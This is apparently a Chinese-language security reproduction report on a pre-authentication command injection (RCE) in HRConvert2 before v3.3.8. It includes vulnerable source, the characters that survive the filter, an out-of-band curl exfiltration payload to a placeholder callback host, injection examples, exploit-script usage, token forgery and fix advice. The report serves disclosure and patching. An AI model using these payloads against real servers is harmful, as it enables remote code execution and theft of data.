# HRConvert2 前认证命令注入 RCE 复现报告

复现日期：2026-10-09
目标项目：[zelon88/HRConvert2](https://github.com/zelon88/HRConvert2)
安全公告：[GHSA-f74g-4wj8-j35h](https://github.com/zelon88/HRConvert2/security/advisories/GHSA-f74g-4wj8-j35h)

---

## 0. 适用版本（先看这里）

| 项目 | 说明 |
| --- | --- |
| **受影响版本** | HRConvert2 **< v3.3.8**（v3.3.7 及之前**所有**版本） |
| **修复版本** | **v3.3.8**（提交 `8903fb86`，2026-05-04） |
| **本报告复现版本** | 官方镜像 `zelon88/hrconvert2:v3.3.7`（上游 commit `33fab6cf`） |
| **不受影响** | v3.3.8 及以上；官方镜像 `latest`（= v3.8.4）已修复，**不可复现** |
| **可复现的 Docker 标签** | `v3.3.7`、`v3.3.3`、`v3.3.2`（Docker Hub 无 `v3.3.8` 标签，最早已修复镜像为 `v3.4.5`） |

> 安全公告原文结论："The vulnerability impacts **all versions of HRConvert2 prior to v3.3.8**"，两种利用方式：
> **Method 1** 用**反引号**注入命令（www-data 权限执行）；**Method 2** 用 **Tab** 字符远程投递文件。

**版本核对依据**：本报告复现版本 `v3.3.7` 的源码特征与原始分析报告逐条吻合——`convertCore.php` 2240 行、`sanitizeString` 第 67-69 行、`verifyTokens` 第 249 行、`shell_exec('ffmpeg -y -i ...')` 第 1044 行、`Resources/config.php:242` 的 `$SupportedConversionTypes`、`config.php:42-47` 的 6 个 `SoRa…` 盐。

---

## 1. 结论

- **成立**：`convertCore.php` 的 `sanitizeString()` 未过滤**反引号 `** 与 **Tab（chr(9)）**，用户可控的 `userconvertfilename` 经字符串拼接进入 `shell_exec()`，形成**前认证命令注入 → 远程命令执行（RCE，www-data 权限）**。
- **默认配置下可触发**：项目默认无认证入口且默认开启 Audio/Video/Image/Archive/OCR 等转换类型。
- **已动态复现**：详见第 5 节（marker 落盘、时间盲注、日志、OOB 外带）。
- **弱令牌（可获取/可离线伪造）成立**：`Token2 = ripemd160(Token1 + 固定盐)`，默认盐未改时可离线伪造 → 与 RCE 链拼接。
- **"缺失 Token2 即可绕过"不成立**（对代码反证）。

---

## 2. 目标信息

- 项目：HRConvert2（自托管的文件转换服务器）
- 复现版本：官方 Docker 镜像 `zelon88/hrconvert2:v3.3.7`（上游 commit `33fab6cf`，ConfigVersion v3.3.7）
- 运行环境：容器内 Apache 2.4.59 + PHP 8.1.29，含 `/usr/bin/ffmpeg`、`/usr/bin/convert` 等
- Web 入口：`/HRProprietary/HRConvert2/convertCore.php`
- 依赖条件：`shell_exec` 未禁用；对应转换工具存在（本项目要求安装 ffmpeg 等）

---

## 3. 漏洞详情

### 3.1 根因：过滤函数漏掉了反引号与 Tab

```php
// convertCore.php:67-69 (sanitizeString) —— v3.3.7
function sanitizeString($Variable, $strict) {
  if ($strict) $Variable = htmlentities(trim(str_replace(' ', '_', str_replace('..', '', str_replace('//', '', str_replace(str_split('|\\~#[](){};:$!#^&%@>*<"\'/'), '', $Variable))))), ENT_QUOTES, 'UTF-8');
  if (!$strict) $Variable = htmlentities(trim(str_replace(' ', '_', str_replace('..', '', str_replace('//', '', str_replace(str_split('|\\[](){};"\''), '', $Variable))))), ENT_QUOTES, 'UTF-8');
  return $Variable; }
```

过滤用**黑名单删除**实现，但**没有列出反引号 `` ` ``、Tab（`chr(9)`）**（以及换行/CR）。因此这两个字符可穿透。

### 3.2 实测可穿透字符集（strict 过滤后）

在 v3.3.7 容器内以 PHP 复现 `sanitizeString()` 逐字符测试，**过滤后保留**：

```
字母/数字  _  反引号`  TAB  \n  \r  ?  =  +  ,  -  .
```

**被删除**：`| \ ~ # [ ] ( ) { } ; : $ ! ^ & % @ > * < " ' /`，且空格 ` ` → `_`。

> 关键含义：**没有 `>` `|` `$` `()` `&` `;` 引号**，所以无法用重定向/管道写文件；但 **换行可作命令分隔符**、**反引号可做命令替换**——这决定了外带思路（见第 4 节）。

### 3.3 传播链（source → sink）

```php
// verifyInputs() —— 用户输入仅做上面的 sanitizeString()
// convertCore.php:292
if (isset($_POST['userconvertfilename'])) list ($UserFilename, ...) = sanitize($_POST['userconvertfilename'], TRUE);

// verifyFile() —— 输出路径拼接（未做 shell 参数转义）
// convertCore.php:1262
list ($NewPathname, ...) = sanitize($ConvertDir.$UserFilename.'.'.$UserExtension, FALSE);

// convertAudio() —— 命令拼接 sink，无 escapeshellarg()
// convertCore.php:1044
$returnData = shell_exec('ffmpeg -y -i '.$pathname.$ext.$br.$newPathname);
```

调用链：`convertFiles()` → `convert()` → `convertAudio()` → `shell_exec()`。

---

## 4. 外带（OOB Exfiltration）技术说明

由于过滤只剩上述字符集，不能重定向写文件，所以采用**换行 + `IFS=` + `curl -d`** 组合外带：

```
<basename>\nIFS=\ncurl\t<CALLBACK_HOST>\t-d\t`<COMMAND>`
```

原理：
1. **换行**（未被过滤）跳出 `ffmpeg` 命令，另起一条语句；
2. **`IFS=`** 关闭 shell 分词——命令输出含空格时不会被拆成多个参数（否则 `curl` 只收到第一个词）；
3. **`curl <host> -d <output>`** 把完整命令输出作为 POST body 回连外带；
4. 目标侧 `curl` **只能用 80 端口**（`host:port` 的冒号会被过滤），故监听端须监听 TCP/80，且不能带路径（`/` 被过滤）。

> 命令本身也受同一黑名单约束（不能含 `/ > $ | " '` 等、空格会被替换为 `_`），因此 `exp.py` 会将 `--command` 中的空格自动转换为 Tab。

对照实验（同一 payload，有无 `IFS=`）：

| payload | 监听端收到 |
| --- | --- |
| `curl hrx -d \`id\``（无 `IFS=`） | `uid=33(www-data)`（仅第一个词） |
| `IFS=` + `curl hrx -d \`id\`` | `uid=33(www-data) gid=33(www-data) groups=33(www-data)`（完整） |

---

## 5. 动态验证证据（v3.3.7）

**部署**：

```bash
docker run -d --name hrconvert2-vuln -p 8080:80 zelon88/hrconvert2:v3.3.7
```

**5.1 命令注入落盘（marker）** — 注入 `` out`touch\tHRC_PROOF` `` 后：

```
/var/www/html/HRProprietary/HRConvert2/HRC_PROOF   (owner: www-data)
```

**5.2 时间盲注** — 基线转换 `0.02s`；注入 `` out`sleep\t8` `` → **58.16s**（含重试，逐次执行 `sleep 8`），Δ≈58s。

**5.3 应用日志** — 未过滤的原始命令逐字进入 `shell_exec`（反引号 + Tab 可见）：

```
ffmpeg -y -i .../sample_real.mp3 -f mp3 /DATA/HRConvert2/<ses>/<ses2>/out`touch	HRC_PROOF`.mp3
ffmpeg -y -i .../sample_real.mp3 -f mp3 /DATA/HRConvert2/<ses>/<ses2>/`whoami`.mp3
```

**5.4 OOB 外带（`exp/exp.py`）** — 监听端收到完整命令输出：

```
POST / body=b'uid=33(www-data) gid=33(www-data) groups=33(www-data).mp3'
```

（末尾 `.mp3` 为程序追加的输出扩展名，脚本会自动去除。）

**5.5 弱令牌（可离线伪造）** — 从页面取得 `Token1`，用 `ripemd160(Token1 + Salts1..6)` 离线计算 `Token2`，与页面下发值**完全一致（MATCH）**，证明默认盐下令牌可复现伪造。

---

## 6. 复现步骤

```bash
# 1) 部署受影响版本
docker run -d --name hrconvert2-vuln -p 8080:80 zelon88/hrconvert2:v3.3.7

# 2) 在攻击端起一个 80 端口的 HTTP 监听（示例：容器 / VPS），用于接收外带
#    监听地址记为 CALLBACK_HOST（目标需能访问，且为 80 端口）

# 3) 运行 EXP（参数化 + 外带）
python3 exp/exp.py \
  -u http://127.0.0.1:8080/HRProprietary/HRConvert2/convertCore.php \
  -C <CALLBACK_HOST> \
  -c "id"

# 可选：EXP 自带监听（需 root 绑 80）
sudo python3 exp/exp.py -C <本机可达IP> --listen -c "id"
```

`exp/exp.py` 参数：`-u/--url`、`-c/--command`、`-C/--callback-host`、`--listen`、`--listen-bind`、`--listen-port`、`-f/--source`、`-e/--extension`、`--timeout`、`--insecure`。

---

## 7. 与历史报告的关系 / 更正

- 本报告取代此前 `reports/` 下的匿名分析与维护者复核记录，并**新增动态复现证据与 OOB 外带脚本**。
- 安全公告（维护者确认）将漏洞定性为 **"Unauthenticated RCE"**：`Token1/Token2` 不构成真实认证边界（匿名即可获取，默认盐下可离线伪造），因此准确定性为**前认证 RCE / 弱令牌下的 RCE**，而非"先绕过强认证再 RCE"。
- 早期"缺失 `Token2` 即可绕过"的结论**不成立**：`verifyInputs()` 会把未提供的 `Token2` 置为空串，`verifyTokens()` 中 `isset($Token2)` 为真且与哈希不符，`$TokensAreValid` 变为 `FALSE`（代码级反证）。

---

## 8. 修复建议

1. **所有 `shell_exec` 参数使用 `escapeshellarg()`**，禁止字符串拼接命令；或改用参数化进程调用。
2. 过滤层不要依赖黑名单：补齐反引号、Tab/换行/CR 等控制字符；但**过滤不能替代参数转义**。
3. 令牌机制与真实服务端会话/权限绑定，缺失或空值直接拒绝；避免使用默认盐，改用每次安装随机密钥。
4. 为危险转换/扫描操作引入明确鉴权与 CSRF 防护。
5. 对 `userconvertfilename/extension/rotate/bitrate/filesToScan` 等启用严格白名单（字符集/长度/格式）。

---

## 9. 验证环境备注

- 本报告结论基于**官方镜像 `zelon88/hrconvert2:v3.3.7` 的动态实测**（marker 落盘、时间盲注、日志、OOB 外带、令牌伪造）。
- 官方 `latest`（v3.8.4）已修复，实测**不可复现**：`sanitizeString` 已过滤反引号与 `chr(9)/chr(10)/chr(13)/chr(0)`，全部 `shell_exec` 改用 `escapeshellarg()` 并套 bubblewrap 沙箱，令牌改为基于每次安装随机 `$SecretKey` 的 HMAC-SHA256。
- 仅用于授权测试。
